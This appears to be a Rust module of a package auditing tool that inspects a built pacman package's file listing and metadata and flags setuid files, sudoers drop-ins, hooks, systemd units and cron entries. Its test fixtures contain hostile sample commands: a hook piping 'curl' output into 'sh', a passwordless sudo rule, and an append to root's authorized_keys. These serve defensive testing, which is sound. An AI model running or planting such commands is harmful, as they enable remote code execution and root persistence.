//! What a *built* package would change on this system, read from the package
//! file without extracting or running anything: setuid files, systemd units,
//! pacman hooks, sudoers drop-ins, accounts, the packaged `.INSTALL`
//! scriptlet. The source audit can't see these — they come out of `package()`.
//! Findings use the audit's severity vocabulary so the same policy applies.
//! See `docs/plan/u17-manifest.md`.

use std::collections::HashMap;

use serde::Serialize;

use crate::audit::{self, AuditReport, Finding, Severity};

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum EntryKind {
    File,
    Dir,
    Symlink,
    Other,
}

/// One member of the package archive.
#[derive(Debug, Clone)]
pub struct Entry {
    /// Without a trailing slash.
    pub path: String,
    pub kind: EntryKind,
    /// Permission bits including setuid (04000), setgid (02000), sticky (01000).
    pub mode: u32,
    pub owner: String,
    pub size: u64,
    pub link: Option<String>,
}

/// Parses `bsdtar -tv` output:
/// `-rwsr-xr-x  0 root   root     1234 Oct 13 15:14 usr/bin/x`.
pub fn parse_listing(listing: &str) -> Vec<Entry> {
    listing.lines().filter_map(parse_line).collect()
}

fn parse_line(line: &str) -> Option<Entry> {
    // Eight whitespace-separated columns, then the path (which may contain
    // spaces) to the end of the line.
    let mut rest = line;
    let mut cols: Vec<&str> = Vec::with_capacity(8);
    for _ in 0..8 {
        rest = rest.trim_start();
        let end = rest.find(char::is_whitespace)?;
        cols.push(&rest[..end]);
        rest = &rest[end..];
    }
    let name = rest.trim_start();
    if name.is_empty() || cols[0].len() < 10 {
        return None;
    }
    let perms = cols[0];
    let kind = match perms.as_bytes()[0] {
        b'-' => EntryKind::File,
        b'd' => EntryKind::Dir,
        b'l' => EntryKind::Symlink,
        _ => EntryKind::Other,
    };
    let (path, link) = match (kind, name.split_once(" -> ")) {
        (EntryKind::Symlink, Some((p, l))) => (p, Some(l.to_string())),
        _ => (name, None),
    };
    Some(Entry {
        path: path
            .trim_start_matches("./")
            .trim_end_matches('/')
            .to_string(),
        kind,
        mode: mode_bits(&perms[1..10]),
        owner: cols[2].to_string(),
        size: cols[4].parse().unwrap_or(0),
        link,
    })
}

/// `rwsr-xr-x` → permission bits with setuid/setgid/sticky.
fn mode_bits(perms: &str) -> u32 {
    let b = perms.as_bytes();
    let mut mode = 0u32;
    for (i, ch) in b.iter().take(9).enumerate() {
        let shift = 8 - i;
        let set = matches!(ch, b'r' | b'w' | b'x') || (i % 3 == 2 && matches!(ch, b's' | b't'));
        if set {
            mode |= 1 << shift;
        }
    }
    if matches!(b.first(), Some(b's' | b'S')) || matches!(b.get(2), Some(b's' | b'S')) {
        mode |= 0o4000;
    }
    if matches!(b.get(5), Some(b's' | b'S')) {
        mode |= 0o2000;
    }
    if matches!(b.get(8), Some(b't' | b'T')) {
        mode |= 0o1000;
    }
    mode
}

/// `key = value` lines of `.PKGINFO`, keys may repeat.
pub fn parse_pkginfo(text: &str) -> HashMap<String, Vec<String>> {
    let mut map: HashMap<String, Vec<String>> = HashMap::new();
    for line in text.lines() {
        if line.starts_with('#') {
            continue;
        }
        if let Some((k, v)) = line.split_once(" = ") {
            map.entry(k.trim().to_string())
                .or_default()
                .push(v.trim().to_string());
        }
    }
    map
}

#[derive(Debug, Clone, Serialize)]
pub struct Manifest {
    pub package: String,
    pub version: String,
    pub files: usize,
    pub installed_size: u64,
    /// Plain facts worth knowing, risky or not.
    pub summary: Vec<String>,
    /// Findings in the audit's vocabulary; `target` is `name version`.
    pub report: AuditReport,
}

fn push(
    findings: &mut Vec<Finding>,
    rule: &'static str,
    severity: Severity,
    path: &str,
    msg: &str,
    excerpt: &str,
) {
    findings.push(Finding {
        rule,
        severity,
        file: path.to_string(),
        line: 0,
        message: msg.to_string(),
        excerpt: excerpt.to_string(),
    });
}

/// `.PKGINFO` text and the archive listing → a manifest. `read` returns the
/// text of a member (for the few small files whose content matters).
pub fn inspect(
    pkginfo: &str,
    listing: &str,
    scriptlet: Option<&str>,
    read: &dyn Fn(&str) -> Option<String>,
) -> Manifest {
    let info = parse_pkginfo(pkginfo);
    let first = |k: &str| info.get(k).and_then(|v| v.first()).cloned();
    let name = first("pkgname").unwrap_or_else(|| "(unknown)".into());
    let version = first("pkgver").unwrap_or_default();
    let entries = parse_listing(listing);

    let mut findings: Vec<Finding> = Vec::new();
    let mut summary: Vec<String> = Vec::new();
    let mut units: Vec<String> = Vec::new();
    let mut accounts: Vec<String> = Vec::new();
    let mut hooks: Vec<String> = Vec::new();

    for e in &entries {
        let p = e.path.as_str();
        if p.starts_with('.') && !p.contains('/') {
            continue; // .PKGINFO, .BUILDINFO, .MTREE, .INSTALL, .CHANGELOG
        }
        let top = p.split('/').next().unwrap_or("");

        if e.kind == EntryKind::File && e.mode & 0o4000 != 0 {
            push(
                &mut findings,
                "setuid-file",
                Severity::High,
                p,
                &format!("is a setuid binary (owned by {})", e.owner),
                p,
            );
        }
        if e.kind == EntryKind::File && e.mode & 0o2000 != 0 {
            push(
                &mut findings,
                "setgid-file",
                Severity::Warning,
                p,
                &format!("is a setgid binary (group {})", e.owner),
                p,
            );
        }
        if p == "etc/ld.so.preload" {
            push(
            &mut findings,
                "ld-preload-file",
                Severity::Critical,
                p,
                "ships /etc/ld.so.preload, which injects a library into every program on the system",
                p,
            );
        }
        if p == "etc/sudoers" || p.starts_with("etc/sudoers.d/") && e.kind != EntryKind::Dir {
            let shown = read(p)
                .and_then(|t| {
                    t.lines()
                        .find(|l| !l.trim().is_empty() && !l.trim().starts_with('#'))
                        .map(|l| l.trim().to_string())
                })
                .unwrap_or_else(|| p.to_string());
            push(
                &mut findings,
                "sudoers-file",
                Severity::High,
                p,
                "grants sudo privileges",
                &shown,
            );
        }
        if (p.starts_with("etc/cron.") || p == "etc/crontab" || p.starts_with("var/spool/cron/"))
            && e.kind != EntryKind::Dir
        {
            push(
                &mut findings,
                "cron-entry",
                Severity::High,
                p,
                "schedules jobs that run on this machine",
                p,
            );
        }
        if matches!(top, "home" | "root") && e.kind != EntryKind::Dir {
            push(
                &mut findings,
                "user-files",
                Severity::High,
                p,
                "installs into a user's home directory",
                p,
            );
        } else if !matches!(
            top,
            "usr" | "etc" | "opt" | "var" | "srv" | "boot" | "home" | "root"
        ) {
            push(
                &mut findings,
                "unusual-location",
                Severity::Warning,
                p,
                "is outside the usual directories (usr, etc, opt, var, srv, boot)",
                p,
            );
        }

        if p.starts_with("usr/share/libalpm/hooks/") && p.ends_with(".hook") {
            let text = read(p).unwrap_or_default();
            let exec: Vec<&str> = text
                .lines()
                .map(str::trim)
                .filter(|l| l.starts_with("Exec"))
                .collect();
            hooks.push(p.rsplit('/').next().unwrap_or(p).to_string());
            push(
                &mut findings,
                "pacman-hook",
                Severity::Warning,
                p,
                "is a pacman hook: it runs a command as root during future package transactions (what it runs is checked separately)",
                exec.first().copied().unwrap_or(p),
            );
            // What the hook runs is code like any other.
            let commands: String = exec
                .iter()
                .filter_map(|l| l.split_once('='))
                .map(|(_, v)| v.trim())
                .collect::<Vec<_>>()
                .join("\n");
            findings.extend(audit::scan_script(p, &commands));
        }
        if p.starts_with("etc/profile.d/") && p.ends_with(".sh") {
            push(
                &mut findings,
                "profile-script",
                Severity::Warning,
                p,
                "runs in every login shell",
                p,
            );
            if let Some(text) = read(p) {
                findings.extend(audit::scan_script(p, &text));
            }
        }
        let is_unit = (p.starts_with("usr/lib/systemd/") || p.starts_with("etc/systemd/"))
            && [".service", ".timer", ".socket", ".path"]
                .iter()
                .any(|x| p.ends_with(x));
        if is_unit && e.kind == EntryKind::File {
            units.push(p.rsplit('/').next().unwrap_or(p).to_string());
            if let Some(text) = read(p) {
                let exec: String = text
                    .lines()
                    .map(str::trim)
                    .filter(|l| l.starts_with("Exec"))
                    .filter_map(|l| l.split_once('=').map(|(_, v)| v.trim()))
                    .collect::<Vec<_>>()
                    .join("\n");
                findings.extend(audit::scan_script(p, &exec));
            }
        }
        if p.contains(".wants/") && e.kind == EntryKind::Symlink {
            push(
                &mut findings,
                "enabled-service",
                Severity::Warning,
                p,
                "enables a unit by default",
                e.link.as_deref().unwrap_or(p),
            );
        }
        if p.starts_with("usr/lib/sysusers.d/") && p.ends_with(".conf") {
            for line in read(p).unwrap_or_default().lines() {
                let mut w = line.split_whitespace();
                match (w.next(), w.next()) {
                    (Some("u"), Some(n)) => accounts.push(format!("user {n}")),
                    (Some("g"), Some(n)) => accounts.push(format!("group {n}")),
                    _ => {}
                }
            }
        }
    }

    if let Some(text) = scriptlet {
        findings.extend(audit::scan_scriptlet(".INSTALL", text));
        let names = audit::function_names(text);
        summary.push(format!(
            "install scriptlet (runs as root): {}",
            if names.is_empty() {
                "yes".to_string()
            } else {
                names.join(", ")
            }
        ));
    }
    if !units.is_empty() {
        units.sort();
        units.dedup();
        summary.push(format!("systemd units: {}", units.join(", ")));
    }
    if !accounts.is_empty() {
        summary.push(format!("creates: {}", accounts.join(", ")));
    }
    if !hooks.is_empty() {
        summary.push(format!("pacman hooks: {}", hooks.join(", ")));
    }
    for (key, label) in [
        ("replaces", "replaces"),
        ("conflict", "conflicts with"),
        ("provides", "provides"),
    ] {
        if let Some(v) = info.get(key) {
            summary.push(format!("{label}: {}", v.join(", ")));
        }
    }
    if let Some(v) = info.get("backup") {
        summary.push(format!("config files kept on upgrade: {}", v.len()));
    }

    audit::sort_findings(&mut findings);
    let files = entries.iter().filter(|e| e.kind != EntryKind::Dir).count();
    let installed_size = first("size")
        .and_then(|s| s.parse().ok())
        .unwrap_or_else(|| entries.iter().map(|e| e.size).sum());
    Manifest {
        report: AuditReport {
            target: format!("{name} {version}"),
            findings,
        },
        package: name,
        version,
        files,
        installed_size,
        summary,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::audit::Verdict;

    /// Real `bsdtar -tv` output of a fixture built with makepkg.
    const LISTING: &str = "\
-rw-r--r--  0 root   root    65008 Oct 13 15:14 .BUILDINFO
-rw-r--r--  0 root   root       70 Oct 13 15:14 .INSTALL
-rw-r--r--  0 root   root      828 Oct 13 15:14 .MTREE
-rw-r--r--  0 root   root      374 Oct 13 15:14 .PKGINFO
drwxr-xr-x  0 root   root        0 Oct 13 15:14 etc/
-rw-r--r--  0 root   root        0 Oct 13 15:14 etc/emrac-test.conf
drwxr-xr-x  0 root   root        0 Oct 13 15:14 etc/profile.d/
-rw-r--r--  0 root   root       25 Oct 13 15:14 etc/profile.d/emrac-test.sh
drwxr-xr-x  0 root   root        0 Oct 13 15:14 etc/sudoers.d/
-rw-r--r--  0 root   root       34 Oct 13 15:14 etc/sudoers.d/emrac-test
drwxr-xr-x  0 root   root        0 Oct 13 15:14 home/
drwxr-xr-x  0 root   root        0 Oct 13 15:14 home/someone/
-rw-r--r--  0 root   root        0 Oct 13 15:14 home/someone/file with space.txt
drwxr-xr-x  0 root   root        0 Oct 13 15:14 usr/
drwxr-xr-x  0 root   root        0 Oct 13 15:14 usr/bin/
-rwxr-sr-x  0 root   root        0 Oct 13 15:14 usr/bin/grouped
lrwxrwxrwx  0 root   root        0 Oct 13 15:14 usr/bin/link -> plain
-rwxr-xr-x  0 root   root        0 Oct 13 15:14 usr/bin/plain
-rwsr-xr-x  0 root   root        0 Oct 13 15:14 usr/bin/rootish
drwxr-xr-x  0 root   root        0 Oct 13 15:14 usr/lib/
drwxr-xr-x  0 root   root        0 Oct 13 15:14 usr/lib/systemd/
drwxr-xr-x  0 root   root        0 Oct 13 15:14 usr/lib/systemd/system/
-rw-r--r--  0 root   root       43 Oct 13 15:14 usr/lib/systemd/system/emrac-test.service
drwxr-xr-x  0 root   root        0 Oct 13 15:14 usr/lib/systemd/system/multi-user.target.wants/
lrwxrwxrwx  0 root   root        0 Oct 13 15:14 usr/lib/systemd/system/multi-user.target.wants/emrac-test.service -> ../emrac-test.service
drwxr-xr-x  0 root   root        0 Oct 13 15:14 usr/lib/sysusers.d/
-rw-r--r--  0 root   root       59 Oct 13 15:14 usr/lib/sysusers.d/emrac-test.conf
drwxr-xr-x  0 root   root        0 Oct 13 15:14 usr/share/
drwxr-xr-x  0 root   root        0 Oct 13 15:14 usr/share/libalpm/
drwxr-xr-x  0 root   root        0 Oct 13 15:14 usr/share/libalpm/hooks/
-rw-r--r--  0 root   root      140 Oct 13 15:14 usr/share/libalpm/hooks/emrac-test.hook
";

    const PKGINFO: &str = "\
# Generated by makepkg 7.1.0
pkgname = emrac-manifest-test
pkgbase = emrac-manifest-test
pkgver = 1.0-1
size = 301
arch = any
replaces = oldtest
conflict = oldtest
backup = etc/emrac-test.conf
depend = bash
";

    fn files(path: &str) -> Option<String> {
        Some(
            match path {
                "usr/share/libalpm/hooks/emrac-test.hook" => {
                    "[Action]\nWhen = PostTransaction\nExec = /usr/bin/sh -c 'curl -s http://e.org/x | sh'\n"
                }
                "usr/lib/systemd/system/emrac-test.service" => {
                    "[Service]\nExecStart=/usr/bin/plain --serve\n"
                }
                "usr/lib/sysusers.d/emrac-test.conf" => {
                    "u emractest - \"Emrac test\" /var/lib/emractest\ng emracgrp -\n"
                }
                "etc/sudoers.d/emrac-test" => "# comment\nemractest ALL=(ALL) NOPASSWD: ALL\n",
                "etc/profile.d/emrac-test.sh" => "export PATH=$PATH:/opt/x\n",
                _ => return None,
            }
            .to_string(),
        )
    }

    fn fixture() -> Manifest {
        inspect(
            PKGINFO,
            LISTING,
            Some("post_install() {\n  systemctl enable x\n}\n"),
            &files,
        )
    }

    fn has(m: &Manifest, rule: &str, sev: Severity, file: &str) -> bool {
        m.report
            .findings
            .iter()
            .any(|f| f.rule == rule && f.severity == sev && f.file == file)
    }

    #[test]
    fn listing_is_parsed_including_spaces_links_and_special_bits() {
        let e = parse_listing(LISTING);
        let by = |p: &str| e.iter().find(|e| e.path == p).unwrap();
        assert_eq!(by("usr/bin/rootish").mode, 0o4755);
        assert_eq!(by("usr/bin/grouped").mode, 0o2755);
        assert_eq!(by("usr/bin/plain").mode, 0o755);
        assert_eq!(by("etc/emrac-test.conf").mode, 0o644);
        assert_eq!(by("usr/bin/link").kind, EntryKind::Symlink);
        assert_eq!(by("usr/bin/link").link.as_deref(), Some("plain"));
        assert_eq!(by("usr").kind, EntryKind::Dir, "trailing slash dropped");
        assert!(by("home/someone/file with space.txt").size == 0);
        assert_eq!(by("etc/sudoers.d/emrac-test").size, 34);
        assert_eq!(by("etc/sudoers.d/emrac-test").owner, "root");
    }

    #[test]
    fn mode_bits_cover_the_special_forms() {
        assert_eq!(mode_bits("rwsr-xr-x"), 0o4755);
        assert_eq!(mode_bits("rwSr--r--"), 0o4644);
        assert_eq!(mode_bits("rwxr-sr-x"), 0o2755);
        assert_eq!(mode_bits("rwxrwxrwt"), 0o1777);
        assert_eq!(mode_bits("rw-------"), 0o600);
    }

    #[test]
    fn pkginfo_keys_may_repeat() {
        let i = parse_pkginfo("depend = a\ndepend = b\nsize = 5\n# c = d\n");
        assert_eq!(i["depend"], ["a", "b"]);
        assert_eq!(i["size"], ["5"]);
        assert!(!i.contains_key("# c"));
    }

    #[test]
    fn what_the_package_changes_is_reported() {
        let m = fixture();
        assert_eq!(
            (m.package.as_str(), m.version.as_str()),
            ("emrac-manifest-test", "1.0-1")
        );
        assert_eq!(m.installed_size, 301);
        assert!(has(&m, "setuid-file", Severity::High, "usr/bin/rootish"));
        assert!(has(&m, "setgid-file", Severity::Warning, "usr/bin/grouped"));
        assert!(has(
            &m,
            "pacman-hook",
            Severity::Warning,
            "usr/share/libalpm/hooks/emrac-test.hook"
        ));
        assert!(has(
            &m,
            "sudoers-file",
            Severity::High,
            "etc/sudoers.d/emrac-test"
        ));
        assert!(has(
            &m,
            "user-files",
            Severity::High,
            "home/someone/file with space.txt"
        ));
        assert!(has(
            &m,
            "profile-script",
            Severity::Warning,
            "etc/profile.d/emrac-test.sh"
        ));
        assert!(has(
            &m,
            "enabled-service",
            Severity::Warning,
            "usr/lib/systemd/system/multi-user.target.wants/emrac-test.service"
        ));
        assert!(!m.report.findings.iter().any(|f| f.file == "usr/bin/plain"));
        let sudoers = m
            .report
            .findings
            .iter()
            .find(|f| f.rule == "sudoers-file")
            .unwrap();
        assert_eq!(
            sudoers.excerpt, "emractest ALL=(ALL) NOPASSWD: ALL",
            "shows the rule, not the comment"
        );
    }

    #[test]
    fn what_a_hook_runs_is_scanned_like_any_code() {
        let m = fixture();
        assert!(has(
            &m,
            "remote-exec",
            Severity::High,
            "usr/share/libalpm/hooks/emrac-test.hook"
        ));
    }

    #[test]
    fn an_ordinary_hook_is_a_warning_and_only_dangerous_content_escalates() {
        let listing = "-rw-r--r--  0 root root 9 Oct 13 15:14 usr/share/libalpm/hooks/ok.hook\n";
        let m = inspect("pkgname = p\npkgver = 1-1\n", listing, None, &|_| {
            Some("[Action]\nExec = /usr/bin/update-thing --cache\n".into())
        });
        assert!(has(
            &m,
            "pacman-hook",
            Severity::Warning,
            "usr/share/libalpm/hooks/ok.hook"
        ));
        assert_eq!(
            m.report.verdict(),
            Verdict::Allow,
            "{:?}",
            m.report.findings
        );

        let m = inspect("pkgname = p\npkgver = 1-1\n", listing, None, &|_| {
            Some("[Action]\nExec = /bin/sh -c 'echo x >> /root/.ssh/authorized_keys'\n".into())
        });
        assert_eq!(
            m.report.verdict(),
            Verdict::Block,
            "{:?}",
            m.report.findings
        );
    }

    #[test]
    fn the_packaged_scriptlet_is_scanned_as_root_code() {
        let m = fixture();
        assert!(has(&m, "install-scriptlet", Severity::Info, ".INSTALL"));
        assert!(
            m.summary.iter().any(|s| s.contains("post_install")),
            "{:?}",
            m.summary
        );
    }

    #[test]
    fn the_summary_lists_the_facts() {
        let m = fixture();
        let s = m.summary.join("\n");
        assert!(s.contains("systemd units: emrac-test.service"), "{s}");
        assert!(s.contains("creates: user emractest, group emracgrp"), "{s}");
        assert!(s.contains("pacman hooks: emrac-test.hook"), "{s}");
        assert!(
            s.contains("replaces: oldtest") && s.contains("conflicts with: oldtest"),
            "{s}"
        );
        assert!(s.contains("config files kept on upgrade: 1"), "{s}");
        // 8 non-directory members other than the dot-files are real files,
        // plus the dot-files themselves.
        assert!(m.files >= 10, "{}", m.files);
    }

    #[test]
    fn verdict_follows_the_audit_policy() {
        assert_eq!(fixture().report.verdict(), Verdict::Confirm);

        let preload = "-rw-r--r--  0 root root 5 Oct 13 15:14 etc/ld.so.preload\n";
        let m = inspect("pkgname = p\npkgver = 1-1\n", preload, None, &|_| None);
        assert_eq!(m.report.verdict(), Verdict::Block);
        assert!(has(
            &m,
            "ld-preload-file",
            Severity::Critical,
            "etc/ld.so.preload"
        ));

        let plain = "-rwxr-xr-x  0 root root 5 Oct 13 15:14 usr/bin/p\n\
                     -rw-r--r--  0 root root 5 Oct 13 15:14 usr/share/doc/p/README\n";
        let m = inspect("pkgname = p\npkgver = 1-1\n", plain, None, &|_| None);
        assert_eq!(m.report.verdict(), Verdict::Allow);
        assert!(m.report.findings.is_empty());
    }

    #[test]
    fn unusual_locations_and_cron_are_flagged_but_ordinary_dirs_are_not() {
        let listing = "\
-rw-r--r--  0 root root 5 Oct 13 15:14 bin/old
-rw-r--r--  0 root root 5 Oct 13 15:14 tmp/x
-rw-r--r--  0 root root 5 Oct 13 15:14 etc/cron.d/job
-rw-r--r--  0 root root 5 Oct 13 15:14 opt/app/bin/a
-rw-r--r--  0 root root 5 Oct 13 15:14 var/lib/app/db
-rw-r--r--  0 root root 5 Oct 13 15:14 boot/vmlinuz-x
";
        let m = inspect("pkgname = p\npkgver = 1-1\n", listing, None, &|_| None);
        assert!(has(&m, "unusual-location", Severity::Warning, "bin/old"));
        assert!(has(&m, "unusual-location", Severity::Warning, "tmp/x"));
        assert!(has(&m, "cron-entry", Severity::High, "etc/cron.d/job"));
        for ok in ["opt/app/bin/a", "var/lib/app/db", "boot/vmlinuz-x"] {
            assert!(!m.report.findings.iter().any(|f| f.file == ok), "{ok}");
        }
    }

    #[test]
    fn garbage_lines_are_ignored() {
        assert!(parse_listing("not a listing\n\n  \n").is_empty());
        assert!(parse_line("-rw-r--r-- 0 root root 5 Oct 13").is_none());
    }
}
